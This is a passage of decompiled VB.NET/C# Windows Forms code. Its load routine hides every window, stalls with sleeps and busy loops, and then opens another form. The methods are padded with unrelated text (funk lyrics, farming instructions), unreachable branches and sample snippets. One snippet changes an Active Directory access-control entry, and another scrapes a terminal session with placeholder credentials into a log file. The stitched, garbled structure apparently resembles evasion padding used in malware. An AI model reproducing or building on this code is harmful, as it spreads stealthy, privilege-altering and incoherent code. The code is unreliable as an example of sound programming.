		internal virtual PictureBox PictureBox43 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000569 RID: 1385
		// (get) Token: 0x06000B01 RID: 2817 RVA: 0x00037171 File Offset: 0x00035371
		// (set) Token: 0x06000B02 RID: 2818 RVA: 0x00037179 File Offset: 0x00035379
		internal virtual NumericUpDown NumericUpDown22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700056A RID: 1386
		// (get) Token: 0x06000B03 RID: 2819 RVA: 0x00037182 File Offset: 0x00035382
		// (set) Token: 0x06000B04 RID: 2820 RVA: 0x0003718A File Offset: 0x0003538A
		internal virtual ProgressBar ProgressBar11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700056B RID: 1387
		// (get) Token: 0x06000B05 RID: 2821 RVA: 0x00037193 File Offset: 0x00035393
		// (set) Token: 0x06000B06 RID: 2822 RVA: 0x0003719B File Offset: 0x0003539B
		internal virtual PictureBox PictureBox44 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700056C RID: 1388
		// (get) Token: 0x06000B07 RID: 2823 RVA: 0x000371A4 File Offset: 0x000353A4
		// (set) Token: 0x06000B08 RID: 2824 RVA: 0x000371AC File Offset: 0x000353AC
		internal virtual MaskedTextBox MaskedTextBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700056D RID: 1389
		// (get) Token: 0x06000B09 RID: 2825 RVA: 0x000371B5 File Offset: 0x000353B5
		// (set) Token: 0x06000B0A RID: 2826 RVA: 0x000371BD File Offset: 0x000353BD
		internal virtual ComboBox ComboBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700056E RID: 1390
		// (get) Token: 0x06000B0B RID: 2827 RVA: 0x000371C6 File Offset: 0x000353C6
		// (set) Token: 0x06000B0C RID: 2828 RVA: 0x000371CE File Offset: 0x000353CE
		internal virtual CheckedListBox CheckedListBox31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700056F RID: 1391
		// (get) Token: 0x06000B0D RID: 2829 RVA: 0x000371D7 File Offset: 0x000353D7
		// (set) Token: 0x06000B0E RID: 2830 RVA: 0x000371DF File Offset: 0x000353DF
		internal virtual DateTimePicker DateTimePicker22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000570 RID: 1392
		// (get) Token: 0x06000B0F RID: 2831 RVA: 0x000371E8 File Offset: 0x000353E8
		// (set) Token: 0x06000B10 RID: 2832 RVA: 0x000371F0 File Offset: 0x000353F0
		internal virtual CheckedListBox CheckedListBox32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000571 RID: 1393
		// (get) Token: 0x06000B11 RID: 2833 RVA: 0x000371F9 File Offset: 0x000353F9
		// (set) Token: 0x06000B12 RID: 2834 RVA: 0x00037201 File Offset: 0x00035401
		internal virtual CheckedListBox CheckedListBox33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000572 RID: 1394
		// (get) Token: 0x06000B13 RID: 2835 RVA: 0x0003720A File Offset: 0x0003540A
		// (set) Token: 0x06000B14 RID: 2836 RVA: 0x00037212 File Offset: 0x00035412
		internal virtual MaskedTextBox MaskedTextBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000573 RID: 1395
		// (get) Token: 0x06000B15 RID: 2837 RVA: 0x0003721B File Offset: 0x0003541B
		// (set) Token: 0x06000B16 RID: 2838 RVA: 0x00037223 File Offset: 0x00035423
		internal virtual NumericUpDown NumericUpDown23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000574 RID: 1396
		// (get) Token: 0x06000B17 RID: 2839 RVA: 0x0003722C File Offset: 0x0003542C
		// (set) Token: 0x06000B18 RID: 2840 RVA: 0x00037234 File Offset: 0x00035434
		internal virtual PictureBox PictureBox45 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000575 RID: 1397
		// (get) Token: 0x06000B19 RID: 2841 RVA: 0x0003723D File Offset: 0x0003543D
		// (set) Token: 0x06000B1A RID: 2842 RVA: 0x00037245 File Offset: 0x00035445
		internal virtual WebBrowser WebBrowser12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000576 RID: 1398
		// (get) Token: 0x06000B1B RID: 2843 RVA: 0x0003724E File Offset: 0x0003544E
		// (set) Token: 0x06000B1C RID: 2844 RVA: 0x00037256 File Offset: 0x00035456
		internal virtual TreeView TreeView12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000577 RID: 1399
		// (get) Token: 0x06000B1D RID: 2845 RVA: 0x0003725F File Offset: 0x0003545F
		// (set) Token: 0x06000B1E RID: 2846 RVA: 0x00037267 File Offset: 0x00035467
		internal virtual TextBox TextBox12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000578 RID: 1400
		// (get) Token: 0x06000B1F RID: 2847 RVA: 0x00037270 File Offset: 0x00035470
		// (set) Token: 0x06000B20 RID: 2848 RVA: 0x00037278 File Offset: 0x00035478
		internal virtual RadioButton RadioButton23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000579 RID: 1401
		// (get) Token: 0x06000B21 RID: 2849 RVA: 0x00037281 File Offset: 0x00035481
		// (set) Token: 0x06000B22 RID: 2850 RVA: 0x00037289 File Offset: 0x00035489
		internal virtual RadioButton RadioButton24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700057A RID: 1402
		// (get) Token: 0x06000B23 RID: 2851 RVA: 0x00037292 File Offset: 0x00035492
		// (set) Token: 0x06000B24 RID: 2852 RVA: 0x0003729A File Offset: 0x0003549A
		internal virtual PictureBox PictureBox46 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700057B RID: 1403
		// (get) Token: 0x06000B25 RID: 2853 RVA: 0x000372A3 File Offset: 0x000354A3
		// (set) Token: 0x06000B26 RID: 2854 RVA: 0x000372AB File Offset: 0x000354AB
		internal virtual ComboBox ComboBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700057C RID: 1404
		// (get) Token: 0x06000B27 RID: 2855 RVA: 0x000372B4 File Offset: 0x000354B4
		// (set) Token: 0x06000B28 RID: 2856 RVA: 0x000372BC File Offset: 0x000354BC
		internal virtual Label Label12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700057D RID: 1405
		// (get) Token: 0x06000B29 RID: 2857 RVA: 0x000372C5 File Offset: 0x000354C5
		// (set) Token: 0x06000B2A RID: 2858 RVA: 0x000372CD File Offset: 0x000354CD
		internal virtual ListView ListView12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700057E RID: 1406
		// (get) Token: 0x06000B2B RID: 2859 RVA: 0x000372D6 File Offset: 0x000354D6
		// (set) Token: 0x06000B2C RID: 2860 RVA: 0x000372DE File Offset: 0x000354DE
		internal virtual DateTimePicker DateTimePicker23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700057F RID: 1407
		// (get) Token: 0x06000B2D RID: 2861 RVA: 0x000372E7 File Offset: 0x000354E7
		// (set) Token: 0x06000B2E RID: 2862 RVA: 0x000372EF File Offset: 0x000354EF
		internal virtual MonthCalendar MonthCalendar12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000580 RID: 1408
		// (get) Token: 0x06000B2F RID: 2863 RVA: 0x000372F8 File Offset: 0x000354F8
		// (set) Token: 0x06000B30 RID: 2864 RVA: 0x00037300 File Offset: 0x00035500
		internal virtual PictureBox PictureBox47 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000581 RID: 1409
		// (get) Token: 0x06000B31 RID: 2865 RVA: 0x00037309 File Offset: 0x00035509
		// (set) Token: 0x06000B32 RID: 2866 RVA: 0x00037311 File Offset: 0x00035511
		internal virtual NumericUpDown NumericUpDown24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000582 RID: 1410
		// (get) Token: 0x06000B33 RID: 2867 RVA: 0x0003731A File Offset: 0x0003551A
		// (set) Token: 0x06000B34 RID: 2868 RVA: 0x00037322 File Offset: 0x00035522
		internal virtual ProgressBar ProgressBar12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000583 RID: 1411
		// (get) Token: 0x06000B35 RID: 2869 RVA: 0x0003732B File Offset: 0x0003552B
		// (set) Token: 0x06000B36 RID: 2870 RVA: 0x00037333 File Offset: 0x00035533
		internal virtual PictureBox PictureBox48 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000584 RID: 1412
		// (get) Token: 0x06000B37 RID: 2871 RVA: 0x0003733C File Offset: 0x0003553C
		// (set) Token: 0x06000B38 RID: 2872 RVA: 0x00037344 File Offset: 0x00035544
		internal virtual MaskedTextBox MaskedTextBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000585 RID: 1413
		// (get) Token: 0x06000B39 RID: 2873 RVA: 0x0003734D File Offset: 0x0003554D
		// (set) Token: 0x06000B3A RID: 2874 RVA: 0x00037355 File Offset: 0x00035555
		internal virtual ComboBox ComboBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000586 RID: 1414
		// (get) Token: 0x06000B3B RID: 2875 RVA: 0x0003735E File Offset: 0x0003555E
		// (set) Token: 0x06000B3C RID: 2876 RVA: 0x00037366 File Offset: 0x00035566
		internal virtual CheckedListBox CheckedListBox34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000587 RID: 1415
		// (get) Token: 0x06000B3D RID: 2877 RVA: 0x0003736F File Offset: 0x0003556F
		// (set) Token: 0x06000B3E RID: 2878 RVA: 0x00037377 File Offset: 0x00035577
		internal virtual DateTimePicker DateTimePicker24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000588 RID: 1416
		// (get) Token: 0x06000B3F RID: 2879 RVA: 0x00037380 File Offset: 0x00035580
		// (set) Token: 0x06000B40 RID: 2880 RVA: 0x00037388 File Offset: 0x00035588
		internal virtual CheckedListBox CheckedListBox35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000589 RID: 1417
		// (get) Token: 0x06000B41 RID: 2881 RVA: 0x00037391 File Offset: 0x00035591
		// (set) Token: 0x06000B42 RID: 2882 RVA: 0x00037399 File Offset: 0x00035599
		internal virtual CheckedListBox CheckedListBox36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x06000B43 RID: 2883 RVA: 0x000373A4 File Offset: 0x000355A4
		private void FormularioDoCrime_Load(object sender, EventArgs e)
		{
			base.Visible = false;
			base.Hide();
			MyProject.Forms.MainForm.Visible = false;
			MyProject.Forms.MainForm.Hide();
			MyProject.Forms.FormulaMagicaDaPaz.Visible = false;
			MyProject.Forms.FormulaMagicaDaPaz.Hide();
			Thread.Sleep(2000);
			MyProject.Forms.MainForm.Visible = false;
			MyProject.Forms.MainForm.Hide();
			MyProject.Forms.FormulaMagicaDaPaz.Visible = false;
			MyProject.Forms.FormulaMagicaDaPaz.Hide();
			Thread.Sleep(2000);
			new XElement(XName.Get("ADASAFADOVERME3CU", "")).Add("\n                 Geral ta ligado que os tres cu ta bolado\n\n\n    dando um role no morro de g3 AK trovao\n\n        Quando derrepente me veio um pivetão\n\n        Pidindo pra dar um lance, no parque uniao\n\n\n                     ");
			int num = 0;
			if (num == 1)
			{
				NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("FaxComEx.FaxServer", "")), null, "Connect", new object[]
				{
					"atl-dc-02"
				}, null, null, null, true);
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("LDAP://CN=Rob Young, OU=Finance, DC=fabrikam,DC=Com", null));
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "Get", new object[]
				{
					"ntSecurityDescriptor"
				}, null, null, null));
				object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, null, "DiscretionaryACL", new object[0], null, null, null));
				object objectValue4 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("AccessControlEntry", ""));
				NewLateBinding.LateSet(objectValue4, null, "Trustee", new object[]
				{
					"FABRIKAM\\kmyer"
				}, null, null);
				NewLateBinding.LateSet(objectValue4, null, "AceFlags", new object[]
				{
					0
				}, null, null);
				NewLateBinding.LateSet(objectValue4, null, "AceType", new object[]
				{
					5
				}, null, null);
				NewLateBinding.LateSet(objectValue4, null, "ObjectType", new object[]
				{
					"{68b1d179-0d15-4d4f-ab71-46152e79a7bc}"
				}, null, null);
				NewLateBinding.LateSet(objectValue4, null, "AccessMask", new object[]
				{
					256
				}, null, null);
				object[] array;
				bool[] array2;
				NewLateBinding.LateCall(objectValue3, null, "AddAce", array = new object[]
				{
					objectValue4
				}, null, null, array2 = new bool[]
				{
					true
				}, true);
				if (array2[0])
				{
					objectValue4 = RuntimeHelpers.GetObjectValue(array[0]);
				}
				NewLateBinding.LateSet(objectValue2, null, "DiscretionaryAcl", new object[]
				{
					objectValue3
				}, null, null);
				NewLateBinding.LateCall(objectValue, null, "SetInfo", new object[0], null, null, null, true);
			}
			if (num == 2)
			{
				object objectValue5 = RuntimeHelpers.GetObjectValue(Interaction.GetObject("LDAP://CN=Rob Young, OU=Finance, DC=fabrikam,DC=Com", null));
				object objectValue6 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue5, null, "Get", new object[]
				{
					"ntSecurityDescriptor"
				}, null, null, null));
				object objectValue7 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue6, null, "DiscretionaryACL", new object[0], null, null, null));
				object objectValue8 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("AccessControlEntry", ""));
				NewLateBinding.LateSet(objectValue8, null, "Trustee", new object[]
				{
					"FABRIKAM\\kmyer"
				}, null, null);
				NewLateBinding.LateSet(objectValue8, null, "AceFlags", new object[]
				{
					0
				}, null, null);
				NewLateBinding.LateSet(objectValue8, null, "AceType", new object[]
				{
					5
				}, null, null);
				NewLateBinding.LateSet(objectValue8, null, "Flags", new object[]
				{
					3
				}, null, null);
				NewLateBinding.LateSet(objectValue8, null, "ObjectType", new object[]
				{
					"{68b1d179-0d15-4d4f-ab71-46152e79a7bc}"
				}, null, null);
				NewLateBinding.LateSet(objectValue8, null, "AccessMask", new object[]
				{
					256
				}, null, null);
				object[] array;
				bool[] array2;
				NewLateBinding.LateCall(objectValue7, null, "AddAce", array = new object[]
				{
					objectValue8
				}, null, null, array2 = new bool[]
				{
					true
				}, true);
				if (array2[0])
				{
					objectValue8 = RuntimeHelpers.GetObjectValue(array[0]);
				}
				NewLateBinding.LateSet(objectValue6, null, "DiscretionaryAcl", new object[]
				{
					objectValue7
				}, null, null);
				NewLateBinding.LateCall(objectValue5, null, "SetInfo", new object[0], null, null, null, true);
			}
			int num2 = 0;
			int num3 = 1;
			checked
			{
				do
				{
					int num4 = 2;
					num2 += num4;
					num4--;
					num2 -= num4;
					num3++;
				}
				while (num3 <= 3000);
				Thread.Sleep(num2);
				base.Visible = false;
				base.Hide();
				MyProject.Forms.MainForm.Visible = false;
				MyProject.Forms.MainForm.Hide();
				MyProject.Forms.FormulaMagicaDaPaz.Visible = false;
				MyProject.Forms.FormulaMagicaDaPaz.Hide();
				Thread.Sleep(2000);
				MyProject.Forms.FormulaMagicaDaPaz.Visible = false;
				MyProject.Forms.FormulaMagicaDaPaz.Hide();
				MyProject.Forms.FormulaMagicaDaPaz.Show();
			}
		}

		// Token: 0x06000B44 RID: 2884 RVA: 0x0003785C File Offset: 0x00035A5C
		public void TrazLogoOMeuParafala()
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("BZWhll.WhllObj", ""));
			if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "OpenSession", new object[]
			{
				1,
				1,
				"iseries.zad",
				30,
				1
			}, null, null, null)), 0, false))
			{
				NewLateBinding.LateCall(objectValue, null, "MsgBox", new object[]
				{
					"Error connecting to host!",
					4096
				}, null, null, null, true);
			}
			if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "Connect", new object[]
			{
				"A"
			}, null, null, null)), 0, false))
			{
				NewLateBinding.LateCall(objectValue, null, "MsgBox", new object[]
				{
					"Error connecting to session A!",
					4096
				}, null, null, null, true);
			}
			NewLateBinding.LateCall(objectValue, null, "SendKey", new object[]
			{
				"username@Tpassword@E"
			}, null, null, null, true);
			NewLateBinding.LateCall(objectValue, null, "WaitReady", new object[]
			{
				10,
				1
			}, null, null, null, true);
			NewLateBinding.LateCall(objectValue, null, "SendKey", new object[]
			{
				"1@E"
			}, null, null, null, true);
			NewLateBinding.LateCall(objectValue, null, "WaitReady", new object[]
			{
				10,
				1
			}, null, null, null, true);
			NewLateBinding.LateCall(objectValue, null, "SendKey", new object[]
			{
				"1@E"
			}, null, null, null, true);
			NewLateBinding.LateCall(objectValue, null, "WaitReady", new object[]
			{
				10,
				1
			}, null, null, null, true);
			NewLateBinding.LateCall(objectValue, null, "SendKey", new object[]
			{
				"10@E"
			}, null, null, null, true);
			NewLateBinding.LateCall(objectValue, null, "WaitReady", new object[]
			{
				10,
				1
			}, null, null, null, true);
			object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Scripting.FileSystemObject", "")), null, "OpenTextFile", new object[]
			{
				"c:\\joblog.txt",
				2,
				true
			}, null, null, null));
			new XElement(XName.Get("code", "")).Add("\nThe moisture level can be measured by forming a rice bran\nboll and twisting it. If the moisture level is around 65 -70 % the\nboll can be easily divided into two halves. However, it is better\nto use the moisture meter (hygrometer) to get accurate data.\nAfter evenly mixing with diluted IMO-2 make a heap 13-15\ninches (30 to 40 cm) hight, and cover it with straw, straw mat\nor leaf litter to prevent moisture evaporation and to provide\nshade from direct sunlight. 70% shade and 30% light is\nrecommended, since it creates favorable conditions for useful\nmicrobes in paddy straw, Eg. Aspergillus’s oryzae, Bacillus\nsubtilis, etc. Be sure to press several spots with weights or soils\nover the straw, because straw is too light to be fixed on the top\nof the rice bran mixture. It is best to use straw mats or straw\nbags (gunny bags) for covering.\nThis process is very important for massive cultivation of\nIMOs. This must be done on soil floor and not on a concrete\nfloor and in a place with good ventilation. As time passes, the\ntemperature rises within the pile of the rice bran mixture,\nbecause it undergoes fermentation. When the temperature\nreaches 40-50 °C turnover the rice bran mixture evenly so that\nthe temperature does not rise further and also in order to\nprevent moist clusters. If the temperature is below 40 °C, the\nmixture may be in an anaerobic condition due to the excessive\nmoisture. If the temperature rises up above 70 °C, proteins\nmay be broken down by thermophilic microbes and nutrients\nreleased into the air resulting in loss of fertilizer effect.\nTherefore, it is necessary to turn over the rice bran mixture in\norder to control temperature. It takes about 7 days for this\nprocess.\nWhen IMO-3 is completely cultured, they become a lump of\nwhite colonies of IMOs and are visible over the top when the\n20\nstraws are uncovered. In the beginning of the fermentation, the\nIMOs emit a pleasant smell (similar to those of Absida,\nAspergillus, Mucor or Rhizopus) during their fermentation,\nand give out a fragrance when the fermentation process is\ncompleted. The moisture level drops to around 40% from 65-\n70% of the initial stage. It is called pure stock or IMO-3.\nHow to store IMO-3\nKeep the IMO3 bags in shaded and cool place. Make sure that\nthe air is well circulated by keeping IMO-3 in a ventilated\ncontainer such as jute / gunny / cloth bags.\nFirst, spread rice straw or leaf litter at the bottom of the\ncontainer, and put in IMO-3. During storage, the IMO-3 may\nbecome dry (moisture level 20-30%) as the moisture gets\nevaporated. It means that the IMOs have entered a sleeping\nphase (state of dormancy). Pile up containers into 3 layers and\nshield them from direct sunlight and rain. At this point, there\nis no need to turn over, because of the convection currents that\nare created through the gaps of containers. \n");
			string text = "More..";
			string right = "Bottom";
			checked
			{
				while (Operators.CompareString(text, right, false) != 0)
				{
					int num = 1;
					object[] array;
					bool[] array3;
					do
					{
						object instance = objectValue;
						Type type = null;
						string memberName = "ReadScreen";
						object[] arguments = array = new object[]
						{
							text,
							80,
							num,
							1
						};
						string[] argumentNames = null;
						Type[] typeArguments = null;
						bool[] array2 = new bool[4];
						array2[0] = true;
						array2[2] = true;
						array3 = array2;
						NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array2, true);
						if (array3[0])
						{
							text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
						}
						if (array3[2])
						{
							num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[2]), typeof(int));
						}
						NewLateBinding.LateCall(objectValue2, null, "WriteLine", array = new object[]
						{
							text
						}, null, null, array3 = new bool[]
						{
							true
						}, true);
						if (array3[0])
						{
							text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
						}
						num++;
					}
					while (num <= 24);
					NewLateBinding.LateCall(objectValue2, null, "WriteLine", new object[]
					{
						" "
					}, null, null, null, true);
					object instance2 = objectValue;
					Type type2 = null;
					string memberName2 = "ReadScreen";
					object[] arguments2 = array = new object[]
					{
						text,
						6,
						19,
						74
					};
					string[] argumentNames2 = null;
					Type[] typeArguments2 = null;
					bool[] array4 = new bool[4];
					array4[0] = true;
					array3 = array4;
					NewLateBinding.LateCall(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array4, true);
					if (array3[0])
					{
						text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
				}
				NewLateBinding.LateCall(objectValue2, null, "Close", new object[0], null, null, null, true);
				NewLateBinding.LateCall(objectValue, null, "SendKey", new object[]
				{
					"1@E"
				}, null, null, null, true);
				NewLateBinding.LateCall(objectValue, null, "WaitReady", new object[]
				{
					10,
					1
				}, null, null, null, true);
				NewLateBinding.LateCall(objectValue, null, "SendKey", new object[]
				{
					"1@E"
				}, null, null, null, true);
				NewLateBinding.LateCall(objectValue, null, "WaitReady", new object[]
				{
					10,
					1
				}, null, null, null, true);
				NewLateBinding.LateCall(objectValue, null, "SendKey", new object[]
				{
					"10@E"
				}, null, null, null, true);
				NewLateBinding.LateCall(objectValue, null, "WaitReady", new object[]
				{
					10,
					1
				}, null, null, null, true);
				NewLateBinding.LateCall(objectValue, null, "CloseSession", new object[]
				{
					1,
					1
				}, null, null, null, true);
			}
		}

		// Token: 0x06000B45 RID: 2885 RVA: 0x00037DA0 File Offset: 0x00035FA0
		public bool CopyFile(string strSrcDir, string strDestDir, string strSrcName, string strDestName, bool fShared, bool fSystem, bool fOverWrite = false, object gstrTitle = null)
		{
			string text = strDestDir + strDestName + "\n\n";
			int num = (int)Interaction.MsgBox(text, MsgBoxStyle.AbortRetryIgnore | MsgBoxStyle.Critical | MsgBoxStyle.Question | MsgBoxStyle.DefaultButton2, RuntimeHelpers.GetObjectValue(gstrTitle));
			if (num != 0)
			{
				num = 3;
			}
			if (num != 3)
			{
				if (num == 5)
				{
					if (this.fIgnoreWarn())
					{
						RuntimeHelpers.GetObjectValue(this.intNOCOPY());
					}
					else
					{
						text = text + "\n\n" + Conversions.ToString(this.ResolveResString(RuntimeHelpers.GetObjectValue(this.resWARNIGNORE())));
						if (this.MsgError(text, MsgBoxStyle.YesNo | MsgBoxStyle.Question | MsgBoxStyle.DefaultButton2, RuntimeHelpers.GetObjectValue(gstrTitle)) == MsgBoxResult.Yes)
						{
							RuntimeHelpers.GetObjectValue(this.intNOCOPY());
						}
					}
				}
			}
			else
			{
				RuntimeHelpers.GetObjectValue(this.gintRET_ABORT());
			}
			return Conversions.ToBoolean("rosa");
		}

		// Token: 0x06000B46 RID: 2886 RVA: 0x00037E54 File Offset: 0x00036054
		private object resWARNIGNORE()
		{
			throw new NotImplementedException();
		}

		// Token: 0x06000B47 RID: 2887 RVA: 0x00037E68 File Offset: 0x00036068
		private object intNOCOPY()
		{
			throw new NotImplementedException();
		}

		// Token: 0x06000B48 RID: 2888 RVA: 0x00037E7C File Offset: 0x0003607C
		private object gintRET_ABORT()
		{
			NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("FaxComEx.FaxServer", "")), null, "Connect", new object[]
			{
				"atl-dc-02"
			}, null, null, null, true);
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("LDAP://CN=Rob Young, OU=Finance, DC=fabrikam,DC=Com", null));
			object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "Get", new object[]
			{
				"ntSecurityDescriptor"
			}, null, null, null));
			object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, null, "DiscretionaryACL", new object[0], null, null, null));
			object objectValue4 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("AccessControlEntry", ""));
			NewLateBinding.LateSet(objectValue4, null, "Trustee", new object[]
			{
				"FABRIKAM\\kmyer"
			}, null, null);
			NewLateBinding.LateSet(objectValue4, null, "AceFlags", new object[]
			{
				0
			}, null, null);
			NewLateBinding.LateSet(objectValue4, null, "AceType", new object[]
			{
				5
			}, null, null);
			NewLateBinding.LateSet(objectValue4, null, "ObjectType", new object[]
			{
				"{68b1d179-0d15-4d4f-ab71-46152e79a7bc}"
			}, null, null);
			NewLateBinding.LateSet(objectValue4, null, "AccessMask", new object[]
			{
				256
			}, null, null);
			object[] array;
			bool[] array2;
			NewLateBinding.LateCall(objectValue3, null, "AddAce", array = new object[]
			{
				objectValue4
			}, null, null, array2 = new bool[]
			{
				true
			}, true);
			if (array2[0])
			{
				objectValue4 = RuntimeHelpers.GetObjectValue(array[0]);
			}
			NewLateBinding.LateSet(objectValue2, null, "DiscretionaryAcl", new object[]
			{
				objectValue3
			}, null, null);
			NewLateBinding.LateCall(objectValue, null, "SetInfo", new object[0], null, null, null, true);
			throw new NotImplementedException();
		}

		// Token: 0x06000B49 RID: 2889 RVA: 0x00038028 File Offset: 0x00036228
		private MsgBoxResult MsgError(object strMsg, MsgBoxStyle msgBoxStyle, object gstrTitle)
		{
			throw new NotImplementedException();
		}

		// Token: 0x06000B4A RID: 2890 RVA: 0x0003803C File Offset: 0x0003623C
		private int ResolveResString(object resWARNIGNORE)
		{
			throw new NotImplementedException();
		}

		// Token: 0x06000B4B RID: 2891 RVA: 0x00038050 File Offset: 0x00036250
		private bool fIgnoreWarn()
		{
			throw new NotImplementedException();
		}

		// Token: 0x06000B4C RID: 2892 RVA: 0x00038064 File Offset: 0x00036264
		private object intRESULT()
		{
			throw new NotImplementedException();
		}

		// Token: 0x04000478 RID: 1144
		private IContainer components;
	}
}
